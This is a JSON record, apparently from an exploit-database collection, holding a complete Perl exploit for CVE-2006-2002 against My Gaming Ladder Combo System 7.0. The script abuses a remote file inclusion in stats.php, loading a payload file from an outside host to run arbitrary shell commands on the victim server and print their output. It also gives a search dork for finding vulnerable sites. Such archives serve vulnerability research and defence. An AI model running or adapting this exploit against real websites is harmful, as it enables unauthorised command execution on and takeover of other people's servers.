{
  "id": "1707",
  "title": "My Gaming Ladder Combo System 7.0 - Remote Code Execution",
  "cve": "CVE-2006-2002",
  "vuln_type": "rce",
  "code": "#!/usr/bin/perl\r\n#Method found & Exploit scripted by nukedx\r\n#Contacts > ICQ: 10072 MSN/Main: nukedx@nukedx.com web: www.nukedx.com\r\n#Original advisory: http://www.nukedx.com/?viewdoc=28\r\n#Usage: ladder.pl <host> <path> <cmd>\r\n#Dork: \"Ladder Scripts by http://www.mygamingladder.com\" 40.500 pages.\r\nuse IO::Socket;\r\nif(@ARGV < 3) { usage(); }\r\nelse { exploit(); }\r\nsub header()\r\n{\r\n  print \"\\n- NukedX Security Advisory Nr.2006-28\\r\\n\";\r\n  print \"- My Gaming Ladder Combo System <= 7.0 Remote Command Execution Exploit\\r\\n\";\r\n}\r\nsub main::urlEncode {\r\n  my ($string) = @_;\r\n  $string =~ s/(\\W)/\"%\" . unpack(\"H2\", $1)/ge;\r\n  #$string# =~ tr/.//;\r\n  return $string;\r\n}\r\nsub usage() \r\n{\r\n  header();\r\n  print \"- Usage: $0 <host> <path> <cmd>\\r\\n\";\r\n  print \"- <host> -> Victim's host ex: www.victim.com\\r\\n\";\r\n  print \"- <path> -> Path to My Gaming Ladder ex: /ladder/\\r\\n\";\r\n  print \"- <cmd>  -> Command to execute ex: ls -la\\r\\n\";\r\n  print \"- This exploit needs allow_url_fopen set to 1 and register_globals on\\r\\n\";\r\n  exit();\r\n}\r\nsub exploit () \r\n{\r\n  #Our variables...\r\n  $echoing  = \"\";\r\n  $ldserver = $ARGV[0];\r\n  $ldserver =~ s/(http:\\/\\/)//eg;\r\n  $ldhost   = \"http://\".$ldserver;\r\n  $lddir    = $ARGV[1];\r\n  $ldport   = \"80\";\r\n  $ldtar    = \"stats.php?dir[func]=&dir[base]=http://www.misssera.com.tr/old/rce.txt%3F&command=\";\r\n  $ldcmd    = \"\"; for ($i=2; $i<=$#ARGV; $i++) {$ldcmd.=\"%20\".urlEncode($ARGV[$i]);};\r\n  $ldreq    = $ldhost.$lddir.$ldtar.$ldcmd;\r\n  #Sending data...\r\n  header();\r\n  print \"- Trying to connect: $ldserver\\r\\n\";\r\n  $ld = IO::Socket::INET->new(Proto => \"tcp\", PeerAddr => \"$ldserver\", PeerPort => \"$ldport\") || die \"- Connection failed...\\n\";\r\n  print $ld \"GET $ldreq HTTP/1.1\\n\";\r\n  print $ld \"Accept: */*\\n\";\r\n  print $ld \"Referer: $ldhost\\n\";\r\n  print $ld \"Accept-Language: tr\\n\";\r\n  print $ld \"User-Agent: NukeZilla\\n\";\r\n  print $ld \"Cache-Control: no-cache\\n\";\r\n  print $ld \"Host: $ldserver\\n\";\r\n  print $ld \"Connection: close\\n\\n\";\r\n  print \"- Connected...\\r\\n\";\r\n  $echoing = \"No\";\r\n  while ($answer = <$ld>) {\r\n    if ($answer =~ /NukedX here/) { $echoing = \"Yes\"; }\r\n    if ($answer =~ /NukedX was here/) { print \"- End of results\\n\"; exit(); }\r\n    if ($echoing =~ /Yes/) { \r\n      if ($answer =~ /NukedX here/) { print \"- Command executed succesfully here is results\\r\\n\"; }\r\n      else { print \"$answer\"; }\r\n    }\r\n  }\r\n  #Exploit failed...\r\n  print \"- Exploit failed\\n\"\r\n}\r\n\r\n# milw0rm.com [2006-04-22]",
  "url": "https://www.exploit-db.com/exploits/1707"
}